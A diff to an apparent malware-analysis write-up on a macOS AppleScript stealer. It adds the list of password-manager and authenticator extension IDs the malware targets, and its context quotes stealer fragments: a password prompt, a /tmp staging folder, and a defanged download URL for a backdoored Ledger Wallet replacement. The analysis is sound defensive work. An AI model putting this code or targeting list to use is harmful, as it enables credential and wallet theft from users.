@@ -712,17 +712,58 @@ Upon execution, the script prompts the user the enter their password, and will r
 <img width="429" height="186" alt="image" src="https://github.com/user-attachments/assets/50026e35-301f-4b95-b21e-e97e910a78b6" />
 
 
-```applescript
+```
 set password_entered to getpwd(username, writemind, "")
 ```
 
 The malware enumerates Chromium-based browsers and a set of cryptocurrency wallet applications/extensions for exfiltration.
+The following extension IDs are checked:
+
+eiaeiblijfjekdanodkjadfinkhbfgcd - NordPass® Password Manager & Digital Vault
+aeblfdkhhhdcdjpifhhbdiojplfjncoa - 1Password – Password Manager
+bfogiafebfohielmmehodmfbbebbbpei - Keeper® Password Manager & Digital Vault
+nngceckbapebfimnlniiiahkandclblb - Bitwarden Password Manager
+fdjamakpfbbddfjaooikfcpapjohcfmg - Dashlane — Password Manager
+hdokiejnpimakedhajhdlcegeplioahd - LastPass: Free Password Manager
+pnlccmojcmeohlpggmfnbbiapkmbliob - RoboForm Password Manager
+ghmbeldphafepmbegfdlkpapadhbakde - Proton Pass: Free Password Manager
+kmcfomidfpdkfieipokbalgegidffkal - Enpass Password Manager
+bnfdmghkeppfadphbnkjcicejfepnbfe - Sticky Password manager & safe
+caljgklbbfbcjjanaijlacgncafpegll - Avira Password Manager
+folnjigffmbjmcjgmbbfcpleeddaedal - LogMeOnce
+igkpcodhieompeloncfnbekccinhapdb - Zoho Vault - Password Manager
+admmjipmmciaobhojoghlmleefbicajg - Norton Password Manager
+ehpbfbahieociaeckccnklpdcmfaeegd - RememBear
+epanfjkfahimkgomnigadpkobaefekcd - IronVest Extension
+didegimhafipceonhjepacocaffmoppf - Passbolt - Open source password manager
+oboonakemofpalcgghocfoadofidjkkk - KeePassXC-Browser
+jgnfghanfbjmimbdmnjfofnbcgpkbegj - KeePassHelper Password Manager
+mmhlniccooihdimnnjhamobppdhaolme - Kee - Password Manager
+dbfoemgnkgieejfkaddieamagdfepnff - 2FAS Auth - Two Factor Authentication
+bhghoamapcdpbohphigoooaddinpkbai - Authenticator
+nngceckbapebfimnlniiiahkandclblb - Bitwarden Password Manager
+lojeokmpinkpmpbakfkfpgfhpapbgdnd - Google Verified Access by Duo
+ibpjepoimpcdofeoalokgpjafnjonkpc - TOTP Authenticator
+gmohoglkppnemohbcgjakmgengkeaphi - 2FA Authenticator
+dckgbiealcgdhgjofgcignfngijpbgba - Open Two-Factor Authenticator
+gmegpkknicehidppoebnmbhndjigpica - Web2FA - Authenticator
+eiokpeobbgpinbmcanngjjbklmhlepan - MFAuth - 2FA Authenticator
+odfkmgboddhcgopllebhkbjhokpojigd - Authenticator Extension
+ppnbnpeolgkicgegkbkbjmhlideopiji - Microsoft Single Sign On
+cejfhijdfemlohmcjknpbeaohedoikpp - Secure TOTP Authenticator - 2FA Code Manager - MFA
+nmhjblhloefhbhgbfkdgdpjabaocnhha - mini authenticator
+iklgijhacenjgjgdnpnohbafpbmnccek - 2! Authenticator
+ppkkcfblhfgmdmefkmkoomenhgecbemi - Authenticator for PC
+lgndjfkadlbpaifdpbbobdodbaiaiakb - Authenticator App
+bbphmbmmpomfelajledgdkgclfekilei - Authenticator app
+bnfooenhhgcnhdkdjelgmmkpaemlnoek - Auto 2FA
+
 
 System information is collected including the Users IP which is actually hardcoded in the initial script as it's populated from when the script is Curled.
 
 The information is initially collected and stored in the direct /tmp/[RANDOM-NUMBER]
 
-```applescript
+```
 set randomNumber to do shell script "echo $((RANDOM % 9000000 + 1000000))"
 set writemind to "/tmp/sync" & randomNumber & "/"
 ```
@@ -756,7 +797,7 @@ The script checks for the presence of '/Applications/Ledger Wallet.app'
 
 If this application exists on the host, it is replaced with a backdoored version downloaded from the malicious domain:
 
-```applescript
+```
 set TREZORURL to "hxxps[://]ballfrank[.]today/trezor/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514"
 set TREZORDMGPATH to "/tmp/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514.zip"
 set TREZORMOUNT to "/tmp"
